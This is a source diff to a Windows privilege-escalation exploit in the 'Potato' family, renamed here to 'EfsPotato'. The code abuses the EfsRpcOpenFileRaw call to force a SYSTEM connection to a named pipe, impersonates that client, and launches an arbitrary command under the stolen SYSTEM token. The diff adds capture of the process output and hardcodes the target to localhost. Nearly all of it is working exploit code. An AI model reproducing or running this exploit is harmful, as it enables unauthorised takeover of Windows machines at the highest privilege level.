@@ -1,5 +1,7 @@
 #include "header.h"
 
+#pragma warning(disable: 4995) 
+
 BOOL g_bInteractWithConsole = FALSE;
 DWORD g_dwSessionId = 0;
 LPWSTR g_pwszCommandLine = NULL;
@@ -121,10 +123,10 @@ DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam)
 	SecureZeroMemory((char*)&(plop), sizeof(plop));
 	swprintf(ExploitBuffer, 100, L"\\\\%s\\potato\\potato", CaptureIp);
 
-	hr = EfsRpcOpenFileRaw(ht, &plop, ExploitBuffer, flag);
+	hr = EfsRpcOpenFileRaw(ht, &plop, ExploitBuffer,flag);
 
 	if (hr == ERROR_BAD_NETPATH) {
-		wprintf(L"success!!!\n");
+		//wprintf(L"success!!!\n");
 	}
 	return 0;
 }
@@ -215,6 +217,7 @@ BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck)
 
 			bResult = TRUE;
 		}
+
 
 		free(pwszPrivilegeName);
 
@@ -327,17 +330,25 @@ HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName)
 	return hThread;
 }
 
+DWORD WINAPI ThreadProc(LPVOID lpParam) {
+	BYTE b[1030];
+	DWORD d = 0;
+	while (ReadFile((HANDLE)lpParam, b, 1024, &d, 0))
+	{
+		b[d] = '\0';
+		printf("%s", b);
+		fflush(stdout);
+	}
+	printf("read flush!", b);
+	return 0;
+}
+
 BOOL GetSystem(HANDLE hPipe)
 {
 	BOOL bResult = FALSE;
 	HANDLE hSystemToken = INVALID_HANDLE_VALUE;
 	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
 
-	DWORD dwCreationFlags = 0;
-	LPWSTR pwszCurrentDirectory = NULL;
-	LPVOID lpEnvironment = NULL;
-	PROCESS_INFORMATION pi = { 0 };
-	STARTUPINFO si = { 0 };
 
 	if (!ImpersonateNamedPipeClient(hPipe))
 	{
@@ -366,29 +377,31 @@ BOOL GetSystem(HANDLE hPipe)
 		}
 	}
 
-	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
-	dwCreationFlags |= 0;
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+	SECURITY_ATTRIBUTES sa;
 
-	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
-		goto cleanup;
 
-	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
-	{
-		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
-		goto cleanup;
-	}
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+	ZeroMemory(&sa, sizeof(sa));
 
-	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
-	{
-		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
-		goto cleanup;
-	}
+	HANDLE hRead, hWrite;
 
-	ZeroMemory(&si, sizeof(STARTUPINFO));
-	si.cb = sizeof(STARTUPINFO);
-	si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
 
-	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+	sa.nLength = sizeof(sa);
+
+	CreatePipe(&hRead, &hWrite, &sa, 0);
+
+
+	si.cb = sizeof(STARTUPINFOA);
+	si.hStdOutput = hWrite;
+	si.hStdError = hWrite;
+	si.dwFlags = 0x00000100;
+
+	if (!CreateProcessAsUserW(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
 		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
 		{
@@ -404,9 +417,22 @@ BOOL GetSystem(HANDLE hPipe)
 	else
 	{
 		wprintf(L"[+] CreateProcessAsUser() OK\n");
+		printf("[+] Process with pid: %d created.\n==============================\n\n", pi.dwProcessId);
+		Sleep(200);
+		CloseHandle(hWrite);
+		BYTE b[1030];
+		DWORD d = 0;
+		while (ReadFile(hRead, b, 1024, &d, 0))
+		{
+			b[d] = '\0';
+			printf("%s", b);
+			fflush(stdout);
+		}
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
 	}
+
 	fflush(stdout);
-	WaitForSingleObject(pi.hProcess, INFINITE);
 
 	bResult = TRUE;
 
@@ -415,27 +441,20 @@ cleanup:
 		CloseHandle(hSystemToken);
 	if (hSystemTokenDup)
 		CloseHandle(hSystemTokenDup);
-	if (pwszCurrentDirectory)
-		free(pwszCurrentDirectory);
-	if (lpEnvironment)
-		DestroyEnvironmentBlock(lpEnvironment);
-	if (pi.hProcess)
-		CloseHandle(pi.hProcess);
-	if (pi.hThread)
-		CloseHandle(pi.hThread);
 
 	return bResult;
 }
 
 int wmain(int argc, wchar_t** argv)
 {
-	if (argc < 3)
+
+	if (argc < 1)
 	{
-		wprintf(L"lsPotato.exe hostname command");
+		wprintf(L"EfsPotato.exe command");
 		return 0;
 	}
-	g_pwszCommandLine =  argv[2];
-	g_pwszHost = argv[1];
+	g_pwszCommandLine =  argv[1];
+	g_pwszHost = (LPWSTR)&L"localhost";
 
 	if (!g_pwszCommandLine)
 	{
